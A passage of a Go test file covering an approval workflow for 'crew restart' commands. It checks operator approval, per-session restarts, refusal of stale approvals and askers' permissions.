	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil); err != denied {
		t.Fatalf("the approval under a policy refusing restart = %v, want %v", err, denied)
	}
	y.SetPolicy(nil)
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if done.Result != "restart requested: yardmaster" {
		t.Fatalf("the approval ran %q", done.Result)
	}
	member, err := y.GetCrew(y.ctx, "yardmaster")
	if err != nil {
		t.Fatal(err)
	}
	if member.RestartRequested != "requested by mckean" {
		t.Fatalf("the crew member's restart is %q", member.RestartRequested)
	}
	evs, err := y.EventsOfKind(y.ctx, "crew_restart_requested", 10)
	if err != nil || len(evs) == 0 {
		t.Fatalf("crew_restart_requested events = %d, %v", len(evs), err)
	}
	y.approved(t, evs[len(evs)-1], seq)
}

// A crew restart with --for restarts the conversation session for the
// user: the card holds that session, and the approval requests its
// restart alone.
func TestRunAskCrewRestartFor(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	if err := y.write(func(w *wtx) error {
		res := new(CrewMember)
		if ok, err := get(w.Tx, bCrew, "yardmaster", res); err != nil || !ok {
			return err
		}
		if res.Config == nil {
			res.Config = map[string]any{}
		}
		// A declared conversation session has no stored row until it is
		// first used; the terminal command still accepts a restart for it.
		res.Config[EnvForPrefix+"ada"] = "ada.env"
		return put(w.Tx, bCrew, "yardmaster", res)
	}); err != nil {
		t.Fatal(err)
	}
	seq := y.ask(t, listAsk("mckean", "crew restart --for ada yardmaster"), "ada")
	run := y.asked(t, seq).Ask.Run
	if want := []string{"crew", "restart", "yardmaster", "--for", "ada"}; !slices.Equal(run.Argv, want) {
		t.Fatalf("the ask holds %q, want %q", run.Argv, want)
	}
	if want := []string{"starts a fresh session of yardmaster for ada once the current one is idle."}; !slices.Equal(run.Does, want) {
		t.Fatalf("the card says %q, want %q", run.Does, want)
	}
	if len(run.Seen["crew yardmaster for ada session"]) != 64 || len(run.Seen["crew yardmaster for ada restart"]) != 64 {
		t.Fatalf("the ask keeps seen %q, want SHA-256 hashes of the conversation session and the request", run.Seen)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if done.Result != "restart requested: yardmaster" {
		t.Fatalf("the approval ran %q", done.Result)
	}
	member, err := y.GetCrew(y.ctx, "yardmaster")
	if err != nil {
		t.Fatal(err)
	}
	if member.Conversations["ada"].RestartRequested != "requested by mckean" {
		t.Fatalf("the conversation session's restart is %q", member.Conversations["ada"].RestartRequested)
	}
	if member.RestartRequested != "" {
		t.Fatalf("the line session's restart is %q, want none", member.RestartRequested)
	}
}

// A restart requested after the ask makes the approval stale: the card
// holds whether one is requested, and a request since is another's.
func TestRunAskCrewRestartStaleOnRequest(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "crew restart yardmaster"), "ada")
	if err := y.RequestRestartFor(y.ctx, "yardmaster", "", "requested by mckean", "", "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, seq, "was written while no restart of yardmaster was requested: one was requested since")
}

// A session ended or restarted after the ask makes the approval stale:
// the card holds the session it was written for, not the one that runs
// now.
func TestRunAskCrewRestartStaleOnSession(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "crew restart yardmaster"), "ada")
	if err := y.CrewStartedFor(y.ctx, "yardmaster", "", map[string]any{"agent": "herdr-1"}); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, seq, "was written for the session yardmaster ran then: it ended or restarted since")
}

// A crew restart is refused past its row: a crew member the yard has not,
// an asker who may restart themselves, a conversation session the member
// has not, a command beside the row's form, and a restart requested
// already.
func TestRunAskCrewRestartRefusals(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	for _, c := range []struct{ command, actor, want string }{
		{"crew restart nobody", "ada", "crew member nobody: not found"},
		{"crew restart yardmaster", "mckean", "needs no approval: run it yourself"},
		{"crew restart yardmaster", "yardmaster", "needs no approval: run it yourself"},
		{"crew restart", "ada", "one crew member, not 0 words"},
		{"crew restart a b", "ada", "one crew member, not 2 words"},
		{"crew restart yardmaster --revision abc", "ada", "crew restart with --revision is the operator's to type in a terminal"},
		{"crew restart yardmaster --for a --for b", "ada", "--for once, not 2 times"},
		{"crew restart yardmaster --for hal", "ada", "has no conversation session for hal"},
	} {
		if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", c.command), c.actor); err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("--run %q as %s = %v, want %q", c.command, c.actor, err, c.want)
		}
	}
	if err := y.RequestRestartFor(y.ctx, "yardmaster", "", "requested by mckean", "", "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", "crew restart yardmaster"), "ada"); err == nil || !strings.Contains(err.Error(), "is requested already, so the command would change nothing") {
		t.Errorf("asking the restart that stands = %v, want it refused as changing nothing", err)
	}
	if notes, err := y.Notes(y.ctx, y.bead); err != nil || len(notes) != 0 {
		t.Fatalf("the refused asks left %d notes, %v", len(notes), err)
	}
}

// A crew restart's check is the command's own leave as the asker: the
// operator's or the yardmaster's, proposed to the operator by anyone
// else. The command's daemon leg is not the check's: the daemon never
// asks.
func TestRunAskCrewRestartUsesItsStoreCheck(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	c, argv, err := parseRun([]string{"crew restart yardmaster"})
	if err != nil {
		t.Fatal(err)
	}
	if c.check == nil {
		t.Fatal("crew restart has no asker permission check")
	}
	var askerErr, operatorErr, masterErr error
	if err := y.write(func(w *wtx) error {
		askerErr = c.check(y.ctx, w, argv, "ada")
		operatorErr = c.check(y.ctx, w, argv, "mckean")
		masterErr = c.check(y.ctx, w, argv, "yardmaster")
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	if class, ok := IsOperatorOnly(askerErr); !ok || class != Askable {
		t.Fatalf("crew restart refusal = %v; operator-only class is %v, %v", askerErr, class, ok)
	}
	if operatorErr != nil {
		t.Errorf("operator's crew restart check = %v, want allowed", operatorErr)
	}
	if masterErr != nil {
		t.Errorf("yardmaster's crew restart check = %v, want allowed", masterErr)
	}
}
